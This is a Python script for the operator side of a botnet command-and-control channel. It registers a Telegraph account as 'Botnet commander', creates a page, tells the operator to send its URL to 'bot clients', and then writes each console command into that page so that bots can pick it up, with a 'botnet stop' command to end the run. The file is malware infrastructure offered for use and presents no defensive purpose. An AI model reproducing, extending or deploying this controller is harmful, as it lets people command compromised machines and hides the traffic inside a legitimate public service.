from enum import Enum
from telegraph_api import Telegraph
import asyncio


async def main():

    try:

        title = "botnet input"
        
        telegraph = Telegraph()
        await telegraph.create_account("Command center", author_name="Botnet commander")
        
        page = await telegraph.create_page(
            title,
            content_html="<p>test</p>"    
        )
        
        print("Input page: \"" + page.url + "\". Send this url to your bot clients")
        await run(telegraph, page.url.replace("https://telegra.ph/", ""), title)

    except:
        print(f"[{page.url.replace("https://telegra.ph/", "")}|WARN] HTTP connection failed. Check your internet connection")
        quit()



MessageType = {
    'INFO': 'INFO', # just a message
    'WARN': 'WARN', # used when stopped executing a command
    'ERROR': 'ERROR' # used when stopped a whole program
}


async def run(telegraph: Telegraph, path: str, title: str):
    last_cmd = ""
    

    def message(msg, type: str):
        try:
            print(f"[{path}|{MessageType[type]}] {msg}")
        except:
            message("Wrong command", MessageType["WARN"])


    while(True): 
        content = input("> ")
        
        if content == last_cmd:
            message("You can't use the same command twice", MessageType["WARN"])
            continue
        
        if content == "botnet stop":
            await telegraph.edit_page(path, title, content_html=f"<p>{content}</p>")
            message("Botnet stopped", MessageType["WARN"])
            quit()
        
        last_cmd = content
        await telegraph.edit_page(path, title, content_html=f"<p>{content}</p>")
        

asyncio.run(main())